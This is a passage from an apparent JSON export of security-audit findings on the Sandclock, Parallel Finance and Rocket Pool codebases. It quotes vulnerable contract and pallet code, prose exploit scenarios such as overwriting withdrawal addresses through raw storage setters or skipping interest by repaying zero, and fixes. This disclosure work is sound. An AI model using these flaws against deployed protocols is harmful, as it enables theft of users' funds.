Miscalculation in beforeWithdraw can leave the vault with less than minimum oat ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "When a user wants to redeem or withdraw, the beforeWithdraw function is called with the number of assets to be withdrawn as the assets parameter. This function makes sure that if the value of the float parameter (that is, the available assets in the vault) is not enough to pay for the withdrawal, the strategy gets some assets back from the pools to be able to pay. function beforeWithdraw ( uint256 assets , uint256 ) internal override { uint256 float = asset.balanceOf( address ( this )); if (assets <= float) return ; uint256 minimumFloat = minimumFloatAmount; uint256 floatRequired = float < minimumFloat ? minimumFloat - float : 0 ; uint256 missing = assets + floatRequired - float; _withdrawToVault(missing); } Figure 3.1: The aected code in sandclock-contracts/src/steth/scWETHv2.sol#L386L396 When the float value is enough, the function returns and the withdrawal is paid with the existing oat. If the float value is not enough, the missing amount is recovered from the pools via the adapters. The issue lies in the calculation of the missing parameter: it does not guarantee that the float value remaining after the withdrawal is at least the value of the minimumFloatAmount parameter. The consequence is that the calculation always leaves a oat equal to floatRequired in the vault. If this value is small enough, it can cause users to waste gas when withdrawing small amounts because they will need to pay for the gas-intensive _withdrawToVault action. This eclipses the usefulness of having the oat in the vault. The correct calculation should be uint256 missing = assets + minimumFloat - float; . Using this correct calculation would make the calculation of the floatRequired parameter unnecessary as it would no longer be required or used in the rest of the code. Exploit Scenario The value for minimumFloatAmount is set to 1 ether in the scWETHv2 contract. For this scenario, suppose that the current oat is exactly equal to minimumFloatAmount . Alice wants to withdraw 0.15 WETH from her invested amount. Because this amount is less than the current oat, her withdrawal is paid from the vault assets, leaving the oat equal to 0.85 WETH after the operation. Then, Bill wants to withdraw 0.9 WETH, but the vault has no available assets to pay for it. In this case, when beforeWithdraw is called, Bill has to pay gas for the call to _withdrawToVault , which is an expensive action because it includes gas-intensive operations such as loops and a ash loan. After Bills withdrawal, the oat in the vault is 0.15 WETH. This is a relatively small amount compared with minimumFloatValue , and it will likely make the next withdrawing/redeeming user also have to pay for the call to _withdrawToVault . Recommendations Short term, replace the calculation of the missing amount to be withdrawn on line 393 of the scWETHv2 contract with assets + minimumFloat - float . This calculation will ensure that the minimum oat restriction is enforced after withdrawals. It will take the required oat into consideration, so the separate calculation of floatRequired on line 392 of scWETHv2 would no longer be required. Long term, add unit or fuzz tests to make sure that the vault has an amount of assets equal to or greater than the minimum expected amount at all times.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Last user in scWETHv2 vault will not be able to withdraw their funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "When a user wants to withdraw, the withdrawal amount is checked against the current vault oat (the uninvested assets readily available in the vault). If the withdrawal amount is less than the oat, the amount is paid from the available balance; otherwise, the protocol has to disinvest from the strategies to get the required assets to pay for the withdrawal. The issue with this approach is that in order to maintain a oat equal to the minimumFloatValue parameter in the vault, the value to be disinvested from the strategies is calculated in the beforeWithdraw function, and its correct value is equal to the sum of the amount to be withdrawn and the minimum oat minus the current oat. If there is only one user remaining in the vault and they want to withdraw, this enforcement will not allow them to do so, because there will not be enough invested in the strategies to leave a minimum oat in the vault after the withdrawal. They would only be able to withdraw their assets minus the minimum oat at most. The code for the _withdrawToVault function is shown in gure 4.1. The line highlighted in the gure would cause the revert in this situation, as there would not be enough invested to supply the requested amount. function _withdrawToVault ( uint256 _amount ) internal { uint256 n = protocolAdapters.length(); uint256 flashLoanAmount ; uint256 totalInvested_ = _totalCollateralInWeth() - totalDebt(); bytes [] memory callData = new bytes [](n + 1 ); uint256 flashLoanAmount_ ; uint256 amount_ ; uint256 adapterId ; address adapter ; for ( uint256 i ; i < n; i++) { (adapterId, adapter) = protocolAdapters.at(i); (flashLoanAmount_, amount_) = _calcFlashLoanAmountWithdrawing(adapter, _amount, totalInvested_); flashLoanAmount += flashLoanAmount_; callData[i] = abi.encodeWithSelector( this .repayAndWithdraw.selector, adapterId, flashLoanAmount_, priceConverter.ethToWstEth(flashLoanAmount_ + amount_) ); } // needed otherwise counted as loss during harvest totalInvested -= _amount; callData[n] = abi.encodeWithSelector(scWETHv2.swapWstEthToWeth.selector, type( uint256 ).max, slippageTolerance); uint256 float = asset.balanceOf( address ( this )); _flashLoan(flashLoanAmount, callData); emit WithdrawnToVault(asset.balanceOf( address ( this )) - float); } Figure 4.1: The aected code in sandclock-contracts/src/steth/scWETHv2.sol#L342L376 Additionally, when this revert occurs, an integer overow is given as the reason, which obscures the real reason and can make the users experience more confusing. Exploit Scenario Bob is the only remaining user in a scWETHv2 vault, and he has 2 ether invested. He wants to withdraw his assets, but all of his calls to the withdrawal function keep reverting due to an integer overow. He keeps trying, wasting gas in the process, until he discovers that the maximum amount he is allowed to withdraw is around 1 ether. The rest of his funds are locked in the vault until the keeper makes a manual call to withdrawToVault or until the admin lowers the minimum oat value. Recommendations Short term, x the calculation of the amount to be withdrawn and make sure that it never exceeds the total invested amount. Long term, add end-to-end unit or fuzz tests that are representative of the way multiple users can interact with the protocol. Test for edge cases involving various numbers of users, investment amounts, and critical interactions, and make sure that the protocols invariants hold and that users do not lose access to funds in the event of such edge cases.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "5. Lido stake rate limit could lead to unexpected reverts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "To mitigate the eects of a surge in demand for stETH on the deposit queue, Lido has implemented a rate limit for stake submissions. This rate limit is ignored by the lidoSwapWethToWstEth method of the Swapper library, potentially leading to unexpected reversions. The Lido stETH integration guide states the following: To avoid [reverts due to the rate limit being hit], you should check if getCurrentStakeLimit() >= amountToStake , and if it's not you can go with an alternative route. function lidoSwapWethToWstEth ( uint256 _wethAmount ) external { // weth to eth weth.withdraw(_wethAmount); // stake to lido / eth => stETH stEth.submit{value: _wethAmount}( address ( 0x00 )); // stETH to wstEth uint256 stEthBalance = stEth.balanceOf( address ( this )); ERC20( address (stEth)).safeApprove( address (wstETH), stEthBalance); wstETH.wrap(stEthBalance); } Figure 5.1: The submit method is subject to a rate limit that is not taken into account. ( sandclock-contracts/src/steth/Swapper.sol#L130L142 ) Exploit Scenario A surge in demand for Ethereum validators leads many people using Lido to stake ETH, causing the Lido rate limit to be hit, and the submit method of the stEth contract begins to revert. As a result, the Sandclock keeper is unable to deposit despite the presence of alternate routes to obtain stETH, such as through Curve or Balancer. Recommendations Short term, have the lidoSwapWethToWstEth method of the Swapper library check whether the amount being deposited is less than the value returned by the getCurrentStakeLimit method of the stEth contract. If it is not, have the code use ZeroEx to swap or revert with a message that clearly communicates the reason for the failure. Long term, review the documentation for all third-party interactions and note any situations in which the integration could revert unexpectedly. If such reversions are acceptable, clearly document how they could occur and include a justication for this acceptance in the inline comments.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Chainlink oracles could return stale price data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "The latestRoundData() function from Chainlink oracles returns ve values: roundId , answer , startedAt , updatedAt , and answeredInRound . The PriceConverter contract reads only the answer value and discards the rest. This can cause outdated prices to be used for token conversions, such as the ETH-to-USDC conversion shown in gure 6.1. function ethToUsdc ( uint256 _ethAmount ) public view returns ( uint256 ) { ( , int256 usdcPriceInEth ,,, ) = usdcToEthPriceFeed.latestRoundData(); return _ethAmount.divWadDown( uint256 (usdcPriceInEth) * C.WETH_USDC_DECIMALS_DIFF); } Figure 6.1: All returned data other than the answer value is ignored during the call to a Chainlink feeds latestRoundData method. ( sandclock-contracts/src/steth/PriceConverter.sol#L67L71 ) According to the Chainlink documentation , if the latestRoundData() function is used, the updatedAt value should be checked to ensure that the returned value is recent enough for the application. Similarly, the LUSD/ETH price feed used by the scLiquity vault is an intermediate contract that calls the deprecated latestAnswer method on upstream Chainlink oracles. contract LSUDUsdToLUSDEth is IPriceFeed { IPriceFeed public constant LUSD_USD = IPriceFeed( 0x3D7aE7E594f2f2091Ad8798313450130d0Aba3a0 ); IPriceFeed public constant ETH_USD = IPriceFeed( 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419 ); function latestAnswer () external view override returns ( int256 ) { return (LUSD_USD.latestAnswer() * 1 ether) / ETH_USD.latestAnswer(); } } Figure 6.2: The custom latestAnswer method in 0x60c0b047133f696334a2b7f68af0b49d2F3D4F72#code#L19 The Chainlink API reference ags the latestAnswer method as (Deprecated - Do not use this function.). Note that the upstream IPriceFeed contracts called by the intermediate LSUDUsdToLUSDEth contract are upgradeable proxies. It is possible that the implementations will be updated to remove support for the deprecated latestAnswer method, breaking the scLiquity vaults lusd2eth price feed. Because the oracle price feeds are used for calculating the slippage tolerance, a dierence may exist between the oracle price and the DEX pool spot price, either due to price update delays or normal price uctuations or because the feed has become stale. This could lead to two possible adverse scenarios:   If the oracle price is signicantly higher than the pool price, the slippage tolerance could be too loose, introducing the possibility of an MEV sandwich attack that can prot on the excess. If the oracle price is signicantly lower than the pool price, the slippage tolerance could be too tight, and the transaction will always revert. Users will perceive this as a denial of service because they would not be able to interact with the protocol until the price dierence is settled. Exploit Scenario Bob has assets invested in a scWETHv2 vault and wants to withdraw part of his assets. He interacts with the contracts, and every withdrawal transaction he submits reverts due to a large dierence between the oracle and pool prices, leading to failed slippage checks. This results in a waste of gas and leaves Bob confused, as there is no clear indication of where the problem lies. Recommendations Short term, make sure that the oracles report up-to-date data, and replace the external LUSD/ETH oracle with one that supports verication of the latest update timestamp. In the case of stale oracle data, pause price-dependent Sandclock functionality until the oracle comes back online or the admin replaces it with a live oracle. Long term, review the documentation for Chainlink and other oracle integrations to ensure that all of the security requirements are met to avoid potential issues, and add tests that take these possible situations into account. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Vulnerable dependencies in the Substrate parachain ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The Parallel Finance parachain node uses the following dependencies with known vulnerabilities. (All of the dependencies listed are inherited from the Substrate framework.) Dependency Version ID", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Users can avoid accruing interest by repaying a zero amount ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "To repay borrowed funds, users call the repay_borrow extrinsic. The extrinsic implementation calls the Pallet::repay_borrow_internal method to recompute the loan balance. Pallet::repay_borrow_internal updates the loan balance for the account and resets the borrow index as part of the calculation. fn repay_borrow_internal ( borrower: & T ::AccountId, asset_id: AssetIdOf <T>, account_borrows: BalanceOf <T>, repay_amount: BalanceOf <T>, ) -> DispatchResult { // ... <redacted> AccountBorrows::<T>::insert( asset_id, borrower, BorrowSnapshot { principal: account_borrows_new , borrow_index: Self ::borrow_index(asset_id) , }, ); TotalBorrows::<T>::insert(asset_id, total_borrows_new); Ok (()) } Figure 2.1: pallets/loans/src/lib.rs:1057-1087 The borrow index is used in the calculation of the accumulated interest for the loan in Pallet::current_balance_from_snapshot . Specically, the outstanding balance, snapshot.principal , is multiplied by the quotient of borrow_index divided by snapshot.borrow_index . pub fn current_balance_from_snapshot ( asset_id: AssetIdOf <T>, snapshot: BorrowSnapshot <BalanceOf<T>>, ) -> Result <BalanceOf<T>, DispatchError> { if snapshot.principal.is_zero() || snapshot.borrow_index.is_zero() { return Ok (Zero::zero()); } // Calculate new borrow balance using the interest index: // recent_borrow_balance = snapshot.principal * borrow_index / // snapshot.borrow_index let recent_borrow_balance = Self ::borrow_index(asset_id) .checked_div(&snapshot.borrow_index) .and_then(|r| r.checked_mul_int(snapshot.principal)) .ok_or(ArithmeticError::Overflow)?; Ok (recent_borrow_balance) } Figure 2.2: pallets/loans/src/lib.rs:1106-1121 Therefore, if the snapshot borrow index is updated to Self::borrow_index(asset_id) , the resulting recent_borrow_balance in Pallet::current_balance_from_snapshot will always be equal to snapshot.principal . That is, no interest will be applied to the loan. It follows that the accrued interest is lost whenever part of the loan is repaid. In an extreme case, if the repaid amount passed to repay_borrow is 0 , users could reset the borrow index without repaying anything. The same issue is present in the implementations of the liquidated_transfer and borrow extrinsics as well. Exploit Scenario A malicious user borrows assets from Parallel Finance and calls repay_borrow with a repay_amount of zero. This allows her to avoid paying interest on the loan. Recommendations Short term, modify the code so that the accrued interest is added to the snapshot principal when the snapshot is updated. Long term, add unit tests for edge cases (like repaying a zero amount) to increase the chances of discovering unexpected system behavior.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "3. Missing validation in Pallet::force_update_market ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The Pallet::force_update_market method can be used to replace the stored market instance for a given asset. Other methods used to update market parameters perform extensive validation of the market parameters, but force_update_market checks only the rate model. pub fn force_update_market ( origin: OriginFor <T>, asset_id: AssetIdOf <T>, market: Market <BalanceOf<T>>, ) -> DispatchResultWithPostInfo { T::UpdateOrigin::ensure_origin(origin)?; ensure!( market.rate_model.check_model(), Error::<T>::InvalidRateModelParam ); let updated_market = Self ::mutate_market(asset_id, |stored_market| { *stored_market = market; stored_market.clone() })?; Self ::deposit_event(Event::<T>::UpdatedMarket(updated_market)); Ok (().into()) } Figure 3.1: pallets/loans/src/lib.rs:539-556 This means that the caller (who is either the root account or half of the general council) could inadvertently change immutable market parameters like ptoken_id by mistake. Exploit Scenario The root account calls force_update_market to update a set of market parameters. By mistake, the ptoken_id market parameter is updated, which means that Pallet::ptoken_id and Pallet::underlying_id are no longer inverses. Recommendations Short term, consider adding more input validation to the force_update_market extrinsic. In particular, it may make sense to ensure that the ptoken_id market parameter has not changed. Alternatively, add validation to check whether the ptoken_id market parameter is updated and to update the UnderlyingAssetId map to ensure that the value matches the Markets storage map.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Missing validation in multiple StakingLedger methods ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The staking ledger is used to keep track of the total amount of staked funds in the system. It is updated in response to cross-consensus messaging (XCM) requests to the parent chain (either Polkadot or Kusama). A number of the StakingLedger methods lack sucient input validation before they update the staking ledgers internal state. Even though the input is validated as part of the original XCM call, there could still be issues due to implementation errors or overlooked corner cases. First, the StakingLedger::rebond method does not use checked arithmetic to update the active balance. The method should also check that the computed unlocking_balance is equal to the input value at the end of the loop to ensure that the system remains consistent. pub fn rebond (& mut self , value: Balance ) { let mut unlocking_balance: Balance = Zero::zero(); while let Some (last) = self .unlocking.last_mut() { if unlocking_balance + last.value <= value { unlocking_balance += last.value; self .active += last.value; self .unlocking.pop(); } else { let diff = value - unlocking_balance; unlocking_balance += diff; self .active += diff; last.value -= diff; } if unlocking_balance >= value { break ; } } } Figure 4.1: pallets/liquid-staking/src/types.rs:199-219 Second, the StakingLedger::bond_extra method does not use checked arithmetic to update the total and active balances . pub fn bond_extra (& mut self , value: Balance ) { self .total += value; self .active += value; } Figure 4.2: pallets/liquid-staking/src/types.rs:223-226 Finally, the StakingLedger::unbond method does not use checked arithmetic when updating the active balance. pub fn unbond (& mut self , value: Balance , target_era: EraIndex ) { if let Some ( mut chunk) = self .unlocking .last_mut() .filter(|chunk| chunk.era == target_era) { // To keep the chunk count down, we only keep one chunk per era. Since // `unlocking` is a FIFO queue, if a chunk exists for `era` we know that // it will be the last one. chunk.value = chunk.value.saturating_add(value); } else { self .unlocking.push(UnlockChunk { value, era: target_era , }); }; // Skipped the minimum balance check because the platform will // bond `MinNominatorBond` to make sure: // 1. No chill call is needed // 2. No minimum balance check self .active -= value; } Figure 4.3: pallets/liquid-staking/src/types.rs:230-253 Since the staking ledger is updated by a number of the XCM response handlers, and XCM responses may return out of order, it is important to ensure that input to the staking ledger methods is validated to prevent issues due to race conditions and corner cases. We could not nd a way to exploit this issue, but we cannot rule out the risk that it could be used to cause a denial-of-service condition in the system. Exploit Scenario The staking ledger's state is updated as part of a WithdrawUnbonded request, leaving the unlocking vector in the staking ledger empty. Later, when the response to a previous call to rebond is handled, the ledger is updated again, which leaves it in an inconsistent state. Recommendations Short term, ensure that the balance represented by the staking ledgers unlocking vector is enough to cover the input balance passed to StakingLedger::rebond . Use checked arithmetic in all staking ledger methods that update the ledgers internal state to ensure that issues due to data races are detected and handled correctly.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "5. Failed XCM requests left in storage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "When the liquid-staking pallet generates an XCM request for the parent chain, the corresponding XCM response triggers a call to Pallet::notification_received . If the response is of the Response::ExecutionResult type, this method calls Pallet::do_notification_received to handle the result. The Pallet::do_notification_received method checks whether the request was successful and then updates the local state according to the corresponding XCM request, which is obtained from the XcmRequests storage map. fn do_notification_received ( query_id: QueryId , request: XcmRequest <T>, res: Option <( u32 , XcmError)>, ) -> DispatchResult { use ArithmeticKind::*; use XcmRequest::*; let executed = res.is_none(); if !executed { return Ok (()); } match request { Bond { index: derivative_index , amount, } => { ensure!( !StakingLedgers::<T>::contains_key(&derivative_index), Error::<T>::AlreadyBonded ); let staking_ledger = <StakingLedger<T::AccountId, BalanceOf<T>>>::new( Self ::derivative_sovereign_account_id(derivative_index), amount, ); StakingLedgers::<T>::insert(derivative_index, staking_ledger); MatchingPool::<T>::try_mutate(|p| -> DispatchResult { p.update_total_stake_amount(amount, Subtraction) })?; T::Assets::burn_from( Self ::staking_currency()?, & Self ::account_id(), Amount )?; } // ... <redacted> } XcmRequests::<T>::remove(&query_id); Ok (()) } Figure 5.1: pallets/liquid-staking/src/lib.rs:1071-1159 If the method completes without errors, the XCM request is removed from storage via a call to XcmRequests<T>::remove(query_id) . However, if any of the following conditions are true, the corresponding XCM request is left in storage indenitely: 1. The request fails and Pallet::do_notification_received exits early. 2. Pallet::do_notification_received fails. 3. The response type is not Response::ExecutionResult . These three cases are currently unhandled by the codebase. The same issue is present in the crowdloans pallet implementation of Pallet::do_notification_received . Recommendations Short term, ensure that failed XCM requests are handled correctly by the crowdloans and liquid-staking pallets.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. Risk of using stale oracle prices in loans pallet ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The loans pallet uses oracle prices to nd a USD value of assets using the get_price function (gure 6.1). The get_price function internally uses the T::PriceFeeder::get_price function, which returns a timestamp and the price. However, the returned timestamp is ignored. pub fn get_price (asset_id: AssetIdOf <T>) -> Result <Price, DispatchError> { let (price, _) = T::PriceFeeder::get_price(&asset_id) .ok_or(Error::<T>::PriceOracleNotReady)?; if price.is_zero() { return Err (Error::<T>::PriceIsZero.into()); } log::trace!( target: \"loans::get_price\" , \"price: {:?}\" , price.into_inner() ); Ok (price) } Figure 6.1: pallets/loans/src/lib.rs: 1430-1441 Exploit Scenario The price feeding oracles fail to deliver prices for an extended period of time. The get_price function returns stale prices, causing the get_asset_value function to return a non-market asset value. Recommendations Short term, modify the code so that it compares the returned timestamp from the T::PriceFeeder::get_price function with the current timestamp, returns an error if the price is too old, and handles the emergency price, which currently has a timestamp of zero. This will stop the market if stale prices are returned and allow the governance process to intervene with an emergency price.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Missing calculations in crowdloans extrinsics ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The claim extrinsic in the crowdloans pallet is missing code to subtract the claimed amount from vault.contributed to update the total contribution amount (gure 7.1). A similar bug exists in the refund extrinsic: there is no subtraction from vault.contributed after the Self::contribution_kill call. pub fn claim ( origin: OriginFor <T>, crowdloan: ParaId , lease_start: LeasePeriod , lease_end: LeasePeriod , ) -> DispatchResult { // ... <redacted> Self ::contribution_kill( vault.trie_index, &who, ChildStorageKind::Contributed ); Self ::deposit_event(Event::<T>::VaultClaimed( crowdloan, (lease_start, lease_end), ctoken, who, amount, VaultPhase::Succeeded, )); Ok (()) } Figure 7.1: pallets/crowdloans/src/lib.rs: 718- Exploit Scenario The claim extrinsic is called, but the total amount in vault.contributed is not updated, leading to incorrect calculations in other places. Recommendations Short term, update the claim and refund extrinsics so that they subtract the amount from vault.contributed . Long term, add a test suite to ensure that the vault state stays consistent after the claim and refund extrinsics are called.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "8. Event emitted when update_vault and set_vrf calls do not make updates ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The update_vault extrinsic in the crowdloans pallet is responsible for updating the three values shown in gure 8.1. It is possible to call update_vault in such a way that no update is performed, but the function emits an event regardless of whether an update occurred. The same situation occurs in the set_vrfs extrinsic (gure 8.2). pub fn update_vault ( origin: OriginFor <T>, crowdloan: ParaId , cap: Option <BalanceOf<T>>, end_block: Option <BlockNumberFor<T>>, contribution_strategy: Option <ContributionStrategy>, ) -> DispatchResult { T::UpdateVaultOrigin::ensure_origin(origin)?; let mut vault = Self ::current_vault(crowdloan) .ok_or(Error::<T>::VaultDoesNotExist)?; if let Some (cap) = cap { // ... <redacted> } if let Some (end_block) = end_block { // ... <redacted> } if let Some (contribution_strategy) = contribution_strategy { // ... <redacted> } // ... <redacted> Self ::deposit_event(Event::<T>::VaultUpdated( crowdloan, (lease_start, lease_end), contribution_strategy, cap, end_block, )); Ok (()) } Figure 8.1: pallets/crowdloans/src/lib.rs:424-472 pub fn set_vrfs (origin: OriginFor <T>, vrfs: Vec <ParaId>) -> DispatchResult { T::VrfOrigin::ensure_origin(origin)?; log::trace!( target: \"crowdloans::set_vrfs\" , \"pre-toggle. vrfs: {:?}\" , vrfs ); Vrfs::<T>::try_mutate(|b| -> Result <(), DispatchError> { *b = vrfs.try_into().map_err(|_| Error::<T>::MaxVrfsExceeded)?; Ok (()) })?; Self ::deposit_event(Event::<T>::VrfsUpdated( Self ::vrfs())); Ok (()) } Figure 8.2: pallets/crowdloans/src/lib.rs:599-616 Exploit Scenario A system observes that the VaultUpdate event was emitted even though the vault state did not actually change. Based on this observation, it performs logic that should be executed only when the state has been updated. Recommendations Short term, modify the VaultUpdate event so that it is emitted only when the update_vault extrinsic makes an actual update. Optionally, have the update_vault extrinsic return an error to the caller when calling it results in no updates.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. The referral code is a sequence of arbitrary bytes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The referral code is used in a number of extrinsic calls in the crowdloans pallet. Because the referral code is never validated, it can be a sequence of arbitrary bytes. The referral code is logged by a number of extrinsics. However, it is currently impossible to perform log injection because the referral code is printed as a hexidecimal string rather than raw bytes (using the debug representation). pub fn contribute ( origin: OriginFor <T>, crowdloan: ParaId , #[pallet::compact] amount: BalanceOf <T>, referral_code: Vec < u8 > , ) -> DispatchResultWithPostInfo { // ... <redacted> log::trace!( target: \"crowdloans::contribute\" , \"who: {:?}, para_id: {:?}, amount: {:?}, referral_code: {:?}\" , &who, &crowdloan, &amount, &referral_code ); Ok (().into()) } Figure 9.1: pallets/crowdloans/src/lib.rs: 502-594 Exploit Scenario The referral code is rendered as raw bytes in a vulnerable environment, introducing an opportunity to perform a log injection attack. Recommendations Short term, choose and implement a data type that models the referral code semantics as closely as possible.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. Missing validation of referral code size ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The length of the referral code is not validated by the contribute extrinsic dened by the crowdloans pallet. Since the referral code is stored by the node, a malicious user could call contribute multiple times with a very large referral code. This would increase the memory pressure on the node, potentially leading to memory exhaustion. fn do_contribute ( who: & AccountIdOf <T>, crowdloan: ParaId , vault_id: VaultId , amount: BalanceOf <T>, referral_code: Vec < u8 >, ) -> Result <(), DispatchError> { // ... <redacted> XcmRequests::<T>::insert( query_id, XcmRequest::Contribute { crowdloan, vault_id, who: who .clone(), amount, referral_code: referral_code .clone() , }, ); // ... <redacted> Ok (()) } Figure 10.1: pallets/crowdloans/src/lib.rs: 1429- Exploit Scenario A malicious user calls the contribute extrinsic multiple times with a very large referral code. This increases the memory pressure on the validator nodes and eventually causes all parachain nodes to run out of memory and crash. Recommendations Short term, add validation that limits the size of the referral code argument to the contribute extrinsic.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "11. Code duplication in crowdloans pallet ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "A number of extrinsics in the crowdloans pallet have duplicate code. The close , reopen , and auction_succeeded extrinsics have virtually identical logic. The migrate_pending and refund extrinsics are also fairly similar. Exploit Scenario A vulnerability is found in the duplicate code, but it is patched in only one place. Recommendations Short term, refactor the close , reopen , and auction_succeeded extrinsics into one function, to be called with values specic to the extrinsics. Refactor common pieces of logic in the migrate_pending and refund extrinsics. Long term, avoid code duplication, as it makes the system harder to review and update. Perform regular code reviews and track any logic that is duplicated.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Any network contract can change any nodes withdrawal address ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "The RocketStorage contract uses the eternal storage pattern. The contract is a key-value store that all protocol contracts can write to and read. However, RocketStorage has a special protected storage area that should not be writable by network contracts (gure 1.1); it should be writable only by node operators under specic conditions. This area stores data related to node operators withdrawal addresses and is critical to the security of their assets. // Protected storage (not accessible by network contracts) mapping(address => address) private withdrawalAddresses; mapping(address => address) private pendingWithdrawalAddresses; Figure 1.1: Protected storage in the RocketStorage contract (RocketStorage.sol#L24-L26) RocketStorage also has a number of setters for types that t in to a single storage slot. These setters are implemented by the raw sstore opcode (gure 1.2) and can be used to set any storage slot to any value. They can be called by any network contract, and the caller will have full control of storage slots and values. function setUint(bytes32 _key, uint _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 1.2: An example of a setter that uses sstore in the RocketStorage contract (RocketStorage.sol#L205-209) As a result, all network contracts can write to all storage slots in the RocketStorage contract, including those in the protected area. There are three setters that can set any storage slot to any value under any condition: setUint, setInt, and setBytes32. The addUint setter can be used if the unsigned integer representation of the value is larger than the current value; subUint can be used if it is smaller. Other setters such as setAddress and setBool can be used to set a portion of a storage slot to a value; the rest of the storage slot is zeroed out. However, they can still be used to delete any storage slot. In addition to undermining the security of the protected storage areas, these direct storage-slot setters make the code vulnerable to accidental storage-slot clashes. The burden of ensuring security is placed on the caller, who must pass in a properly hashed key. A bug could easily lead to the overwriting of the guardian, for example. Exploit Scenario Alice, a node operator, trusts Rocket Pools guarantee that her deposit will be protected even if other parts of the protocol are compromised. Attacker Charlie upgrades a contract that has write access to RocketStorage to a malicious version. Charlie then computes the storage slot of each node operators withdrawal address, including Alices, and calls rocketStorage.setUint(slot, charliesAddress) from the malicious contract. He can then trigger withdrawals and steal node operators funds. Recommendations Short term, remove all sstore operations from the RocketStorage contract. Use mappings, which are already used for strings and bytes, for all types. When using mappings, each value is stored in a slot that is computed from the hash of the mapping slot and the key, making it impossible for a user to write from one mapping into another unless that user nds a hash collision. Mappings will ensure proper separation of the protected storage areas. Strongly consider moving the protected storage areas and related operations into a separate immutable contract. This would make it much easier to check the access controls on the protected storage areas. Long term, avoid using assembly whenever possible. Ensure that assembly operations such as sstore do not enable the circumvention of access controls.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Current storage pattern fails to ensure type safety ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "As mentioned in TOB-ROCKET-001, the RocketStorage contract uses the eternal storage pattern. This pattern uses assembly to read and write to raw storage slots. Most of the systems data is stored in this manner, which is shown in gures 2.1 and 2.2. function setInt(bytes32 _key, int _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 2.1: RocketStorage.sol#L229-L233 function getUint(bytes32 _key) override external view returns (uint256 r) { assembly { r := sload (_key) } } Figure 2.2: RocketStorage.sol#L159-L163 If the same storage slot were used to write a value of type T and then to read a value of type U from the same slot, the value of U could be unexpected. Since storage is untyped, Soliditys type checker would be unable to catch this type mismatch, and the bug would go unnoticed. Exploit Scenario A codebase update causes one storage slot, S, to be used with two dierent data types. The compiler does not throw any errors, and the code is deployed. During transaction processing, an integer, -1, is written to S. Later, S is read and interpreted as an unsigned integer. Subsequent calculations use the maximum uint value, causing users to lose funds. Recommendations Short term, remove the assembly code and raw storage mapping from the codebase. Use a mapping for each type to ensure that each slot of the mapping stores values of the same type. Long term, avoid using assembly whenever possible. Use Solidity as a high-level language so that its built-in type checker will detect type errors.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "Rocket Pool has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the 